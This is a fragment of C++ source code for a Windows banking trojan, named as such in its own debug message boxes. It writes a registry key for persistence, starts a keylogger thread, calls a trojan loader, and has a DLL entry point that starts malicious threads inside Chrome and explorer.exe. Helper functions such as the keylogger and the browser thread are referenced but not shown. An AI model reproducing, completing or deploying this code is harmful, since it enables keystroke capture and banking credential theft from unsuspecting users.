	if ( !getDLLPath(dllPath)) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to get DLL path", L"StartBankingTrojan", MB_OK);
		ExitProcess(-1);
	}

	// Register key first
	if (isUserAdmin()) {
		writeRegedit(dllPath);
	}
	else if(DEBUG){
		MessageBoxW(NULL, L"Please run as administrator\nRun without admin now ", L"BankingTrojan", MB_OK);
		writeRegedit(dllPath); // Maybe fail  but try : (
	}

	//keylogger thread
	DWORD KeyloggerThreadId = 0;
	HANDLE hKeyloggerThread = CreateThread(
		NULL,
		0,
		KeyLoggerMainThread,
		NULL,
		0,
		&KeyloggerThreadId
	);
	TrojanLoader(dllPath);

	// Wait for the keylogger thread to finish
	WaitForSingleObject(hKeyloggerThread, INFINITE);
	CloseHandle(hKeyloggerThread);


	ExitProcess(0);
}

/*
	DLL Entry point
		RunDLL32 => $NULL
		Chrome => ChromeMainThread
		Explorer => ExplorerMainThread
*/
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{

	HANDLE hProcess = GetCurrentProcess();
	wchar_t processName[MAX_PATH] = L"<unknown>";
	wchar_t exploreName[] = L"explorer.exe";
	HANDLE hThread = NULL;
	DWORD threadId = 0;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		initializeLogger();

		HANDLE hProcess = GetCurrentProcess();

		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
		{
			if (_wcsicmp(processName, targetProcessName) == 0) {
				// New thread for chromeMain
				hThread = CreateThread(
					NULL,
					0,
					ChromeMainThread,
					NULL,
					0,
					&threadId
				);

				if (hThread == NULL) {
					// fail to create thread
				}
			}
			else if (_wcsicmp(processName, exploreName)==0) {
				// New thread for explorerMain
				hThread = CreateThread(
					NULL,
					0,
					ExplorerMainThread,
					NULL,
					0,
					&threadId
				);

				if (hThread == NULL) {
					// fail to create thread
				}
			}
			else if (_wcsicmp(processName, exploreName) == 0)
			{
				// todo
			}
		}
	}

	break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
	{
		Logger::getInstance().closeAll();

		if (hThread != NULL) {
			// Terminate thread( Wait DETACH)
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			hThread = NULL;
		}
	}
	break;
	}
	return TRUE;
}

